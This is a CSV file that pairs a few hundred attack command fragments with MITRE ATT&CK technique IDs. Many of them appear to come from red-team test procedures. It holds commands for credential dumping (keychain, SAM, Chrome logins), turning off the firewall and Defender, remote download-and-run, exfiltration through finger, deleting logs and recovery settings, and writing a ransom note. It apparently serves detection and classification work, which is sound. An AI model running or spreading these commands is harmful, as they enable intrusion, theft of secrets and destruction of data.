command,mitre_id
show ssh,T1033
echo $0,T1059
sudo security dump-keychain -d login.keychain,T1555
"$item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\windows\system32"",$null,0)",T1546
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug,T1055
"try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\$target_hive"" , ""$env:TEMP\$target_hivevss$_"", ""true"") } catch {}",T1003
%Program Data%\\Microsoft\\,T1574
/usr/lib/systemd/system/,T1036
dir /s c:\ >> $output_file,T1083
%SystemRoot%\System32\,T1505
"$sheet.Cells.Item(19,1) = ""=FCLOSE(A5)""",T1204
/var/log/syslog,T1070
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",T1562
%temp%\tcm.tmp -encode $executable %temp%\T1140_calc2.txt,T1140
set comspec=$command_to_execute,T1216
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1060
"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",T1216
HKCU\Software\Microsoft\Windows\CurrentVersion\Run,T1547
Start-Sleep 10,T1539
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""",T1137
if (-not (Test-Path -Path $storageAccountOutputPath)) {,T1530
%HiddenReg%,T1564
Get-AzurePasswords -subscription '$subscription_id' > $output_file,T1555
C:\unsafe path with space\program.exe,T1574
"if ($row.FileShareName -ne """"){",T1530
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id,T1114
Accept-Language,T1614
idHook,T1106
"cmd /r cmd<""$input_file""",T1059
foreach ($account in $storageAccounts) {,T1619
"api_option = ""paste""",T1567
cmdkey,T1555
Process = if ($p) { $p.ProcessName } else { $null },T1049
audioddg.pdb,T1036
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v Debugger /d ""$payload_binary""",T1546
username,T1136
"$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""",T1204
sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD),T1490
"systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'",T1053
"New-ItemProperty $ExcelRegPath ""Path"" -value ""notepad.ppam"" -propertyType string | Out-Null",T1137
New-UserPersistenceOption,T1547
{$Response = $_.Exception.Response.GetResponseStream(),T1619
<PID>/mem,T1003
%COMMONPROGRAMFILES%\Microsoft Shared\wmi\,T1036
"esentutl.exe /y ""%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"" /d ""$output_path""",T1555
HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest,T1112
LANG,T1614
nc -nv $host $port,T1046
$SI,T1070
bcdedit.exe,T1490
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*,T1567
"Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",T1555
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,T1564
HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData,T1012
"Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""",T1218
"cmd.exe /c net group ""Domain Admins"" /domain",T1069
"echo ""OnCalendar=*-*-* *:*:00"" >> $path_to_systemd_timer",T1053
Gpscript /logon,T1218
$xlApp.Quit(),T1204
Win32_PnPEntity,T1082
gcloud projects get-iam-policy,T1087
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,T1564
touch -a -t 197001010000.00 $target_filename,T1070
certutil -addstore my $pfx_path,T1553
networksetup -setwebproxy $interface $proxy_server $proxy_port,T1090
GetKeyboardType,T1614
$result | Out-File -Encoding ASCII -append $file,T1016
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f,T1112
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",T1218
Stop-Service -Name EventLog,T1562
$word.Visible = $false,T1137
netsh.exe advfirewall show currentprofile,T1518
java,T1036
DnsQuery_A,T1106
CreateFile,T1106
find $search_path -name id_rsa 2>/dev/null -exec rsync -R {} $output_folder \;,T1552
GetProcessById,T1106
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing,T1204
GetNativeSystemInfo,T1082
%APPDATA%\..\Local\Temporary Internet Files\Content.Word,T1070
~/Library/LaunchAgents/,T1543
systemctl start $systemd_timer_name,T1053
sc config WinDefend start=disabled,T1562
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateXMLUrlFromOC"" -Value ""$remote_url"" -Type String -Force",T1105
"Boot, System",T1485
useradd -M -N -r -s /bin/bash -c evil_account $username,T1136
RmShutDown,T1489
PostMessage,T1055
"sftp -o ProxyCommand=""{CMD}"" .",T1202
"$instance.Document.Application.ShellExecute($driveLetter+"":\document.lnk"","""",$driveLetter+"":\"",$null,0)",T1553
TrustedHosts,T1021
loadfrommem,T1055
catch { $_; exit $_.Exception.HResult},T1036
"echo ""2. Paste this link - https://akira.onion"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
/bin/sh -c,T1059
printf,T1497
"Write-Host ""SeDebugPrivilege enabled successfully."" -ForegroundColor Green",T1562
~/Library/,T1543
rcsi.exe {PATH:.csx},T1127
"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;",T1016
netsh advfirewall set currentprofile state off,T1562
"echo ""*** Delivery channel deleted ***""",T1562
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name,T1114
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe,T1219
takeown /F C:\Windows\System32\sethc.exe /A,T1546
wmic MEMPHYSICAL get MaxCapacity,T1082
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,T1216
net start w32time,T1547
C:\Windows\System32\winevt\logs\,T1070
timeout 20,T1497
sudo cp $script_location $script_destination,T1543
Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue,T1098
"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)",T1053
netsh wlan show,T1016
cp /bin/sh /tmp/crond;,T1036
$NewClass.Put(),T1047
System info.txt,T1560
"set-servicebinarypath -name ""$service_name"" -path ""$new_bin_path""",T1543
w32tm /tz,T1124
$User.Enabled = $True,T1136
"Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore",T1070
Update.exe --removeShortcut={PATH:.exe}-l=Startup,T1070
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""$hollow_binary_path"" -debug",T1055
} catch { return $false },T1083
Start-NetEventSession -Name Capture007,T1040
"$which_python -c ""import tarfile; output_file = tarfile.open('$path_to_output_file','w'); output_file.add('$path_to_input_file'); output_file.close()""",T1560
procdump.exe -md {PATH:.dll} explorer.exe,T1202
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'",T1546
net user art-test /add,T1078
Microsoft.IdentityServer.Servicehost.exe.config,T1556
"pnputil.exe /add-driver ""$driver_inf""",T1547
nltest /domain_trusts /all_trusts,T1482
net user $ ATOMIC123! /add /active:yes,T1564
echo $fish_encoded | base64 -d | bash,T1140
Winlangdb.pdb,T1036
pam_unix.so,T1556
"Set-ItemProperty -Path $registryPath -Name ""ServiceDll"" -Value $newServiceDll",T1505
cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/,T1110
"compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force",T1555
using System.Runtime.InteropServices;,T1491
querySpn.vbs,T1087
klist,T1558
testcat(){ (while read line; do echo $line >> $output_file; done < $1) },T1003
"if($member -like ""*Administrator*"") {",T1098
"echo ""Manipulated data"" > ~/Library/Mail/copy/manipulated.txt",T1070
HKLM\SYSTEM\CurrentControlSet\Services\DeviceSync\,T1543
mstsc /v:$Server,T1021
GetProcessesByName,T1057
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""",T1137
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug,T1055
Start-Process $file1 /S;,T1219
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1012
and/or,T1070
net user,T1087
CreateProcessA(),T1106
$ACL.SetAccessRule($accessRule),T1505
"$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()",T1539
systemctl restart T1543.002,T1543
/usr/bin/security dump-keychain -d,T1555
system account remove,T1531
test.gif,T1036
sudo cat /usr/local/etc/sudoers,T1548
"net group ""BUILTIN\Backup Operators"" /domain",T1069
mshta,T1218
"Write-Host ""Done!""",T1567
DNSGetCacheDataTable,T1018
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices""",T1012
"cmd.exe /c ""$local_folder\$local_executable"" kerberoast $flags /outfile:""$local_folder\$out_file""",T1558
bcdedit /set {default} recoveryenabled No,T1490
check_registry_keys,T1012
WSARecv,T1106
Connect-AzureAD -Credential $Credential 2>&1> $null,T1110
C:\windows\system32\drivers\etc\hosts,T1556
ProtocolHandler.exe {REMOTEURL},T1105
icacls,T1222
kubectl run $pod_name --image=$image_name --restart=Never --rm -it -- curl -ksL $remote_url,T1105
makecab /F {PATH:.ddf},T1036
osascript /path/to/script,T1059
eoffice.exe,T1036
showmount $computer_name,T1135
echo $PWD_SPOOF,T1056
HKLM\SAM\SAM\Domains\Account\F,T1003
"reg add ""HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"" /ve /d "".pwn"" /f",T1548
"Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""",T1098
echo %APPDATA%,T1083
GMER64.sys,T1562
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,T1564
"Stop-Process -Name ""WebBrowserPassView""",T1555
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /ve /T REG_SZ /d ""C:\WINDOWS\system32\scrobj.dll"" /f",T1546
Invoke-WebRequest $pua_url -OutFile $pua_file,T1204
Connect-AzureAD -Credential $Credential,T1082
WorkFolders,T1218
Set-AADIntUserMFA,T1556
credphisher.py,T1056
vim-cmd vmsvc/snapshot.removeall,T1490
sudo cp $path_malicious_plist /Library/LaunchAgents/$plist_filename,T1543
echo $HISTSIZE,T1562
attrib.exe -r $file_or_folder\*.* /s,T1222
"reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\$ETWProviderGUID"" /v ""Enabled"" /t REG_DWORD /d ""0"" /f",T1562
sudo srm -r $system_log_folder #recursive deletion of log files,T1070
PTRACE_POKEDATA,T1055
diantz,T1560
"find / -path ""*/Safari/Bookmarks.plist"" 2>/dev/null >> $output_file",T1217
Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue,T1098
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages,T1547
"ren ""%temp%\upload"" audiodg.exe",T1036
"New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""",T1547
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml},T1127
"C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;$command_to_execute""",T1216
netsh advfirewall firewall,T1518
sed -i '$ a #art_test_1562_006_1' /etc/audisp/$audisp_config_file_name,T1562
attrib.exe +h $file_to_modify,T1564
-NoProfile,T1546
"echo ""[Install]"" >> $systemd_service_path/$systemd_service_file",T1543
echo 'uname -a' >> /tmp/art_payload.sh,T1027
$content | Set-Content -Path $tmpFunctionCode # Write the modified content to the file,T1528
foreach($container in $containers) {,T1619
Disable-AntiPhishRule -Identity $test.Name -Confirm:$false,T1562
&lt;user-home&gt;/.ssh/authorized_keys,T1098
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""",T1202
_VBA_PROJECT,T1564
/proc/locks,T1057
LocalCommand,T1202
$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug,T1106
odbcconf -f {PATH:.rsp},T1218
"Mount-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso""",T1204
show flash,T1083
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
/Network/Library/Keychains/,T1555
wmic group get name,T1069
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL,T1574
foreach ($port in $ports) {,T1016
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"" /v Configuration /t REG_SZ /d malware_test /f",T1546
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIntrusionPreventionSystem"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
ping -c $ping_count 8.8.8.8 > /dev/null,T1497
HKCU\Software\Microsoft\Office test\Special\Perf,T1137
.desktop,T1547
chmod +x $script_path,T1059
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security"" /v Level /t REG_DWORD /d 1 /f",T1137
echo 'import os' >> $python_script_name,T1059
mkdir -p $test_folder,T1560
del %TEMP%\redcanary.cab >nul 2>&1,T1105
su nobody,T1078
kubectl run $pod_name --image=$image_name --restart=Never --rm -it -- sh -lc 'adduser -D $username && id $username',T1136
"InstallUtilPath = ""$Env:windir\System32\Tasks\notepad.exe""",T1218
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -sc dclist",T1018
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",T1003
sitemanager.xml,T1005
"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember ""Domain Admins""",T1069
"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableRemoteDesktopAntiAlias"" /t REG_DWORD /d 1 /f",T1112
"grep -i ""PASS"" ""$output_file""",T1003
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},T1105
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses $optional_args",T1087
Extexport.exe {PATH_ABSOLUTE:folder} foo bar,T1218
"Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""",T1098
"ssh localhost ""{CMD}""",T1202
3e2717e8b3873b29,T1027
sc.exe stop $service_name,T1489
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y,T1036
0x53D525,T1057
"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",T1218
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f",T1112
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run,T1547
directories of the user owned directories (,T1543
schtasks.exe /F /Create /TN Microsoft_Licensing /sc minute /MO 1 /TR C:\\Users\\Public\\Libraries\...,T1053
RegisterServiceCtrlHandler,T1106
if $(printenv SHELL >/dev/null); then printenv SHELL; fi,T1059
$totalports++ | Out-Null,T1016
"Write-Host ""Error: domain """"$domain_name"""" not verified""",T1484
nohup,T1564
ticketer.py,T1558
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force",T1484
for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/$host/$port) && echo port $port is open ; done,T1046
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx""",T1012
"sudo lsmod | grep -i ""vmw_baloon\|vmxnet""",T1082
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'""",T1491
taskhostsvc.exe,T1036
tftp,T1105
az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString,T1530
reg query HKLM\SYSTEM\CurrentControlSet\Services\[service name]\Parameters,T1012
match keys,T1546
Connect-AzAccount -Credential $Credential,T1082
AdjustTokenPrivilege,T1134
C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup,T1547
Evil.txt.exe,T1036
"Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""",T1098
/Library/LaunchDaemons,T1053
CreateToolHelp32Snapshot(),T1057
"New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name T1112 -Value ""<script>""",T1112
takeown /F,T1222
"$wc.DownloadFile($url, $imgLocation)",T1491
%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\,T1555
dir /s * .xml,T1552
"$which_python -c ""import bz2;input_file=open('$path_to_input_file','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('$path_to_output_file','w+');output_file.write(str(bz2content));output_file.close();""",T1560
public struct TOKEN_PRIVILEGES {,T1562
find $search_path -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} $output_folder \;,T1552
"rundll32.exe keymgr,KRShowKeyMgr",T1003
finger base64_filedata@$remote_host,T1105
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore,T1558
type C:\Windows\Panther\Unattend\unattend.xml,T1552
/Library/Application Support/com.apple.TCC/TCC.db,T1548
Invoke-WCMDump,T1555
netsh.exe advfirewall firewall dump,T1518
if [ -f /etc/mtab ]; then cat /etc/mtab >> $output_file; fi;,T1083
mdfind,T1083
qwinsta.exe /server:$computer_name,T1033
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender"" -NoRestart -ErrorAction Ignore",T1562
HKEY_CURRENT_USER\Console\QuickEdit,T1012
"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *",T1482
"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9",T1048
lsd,T1083
python.exe,T1059
reg export HKLM\sam %temp%\sam,T1003
ZwAlertResumeThread,T1055
$User.SetPassword($TempCred.GetNetworkCredential().Password),T1136
Set-MpPreference -dbaf $True,T1562
"Invoke-Sharpweb -command ""all""",T1555
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /t REG_DWORD /d 0 /f",T1484
%tmp%/T1106.exe,T1106
Pcwrun.exe /../../$(calc).exe,T1202
"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f",T1036
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force",T1547
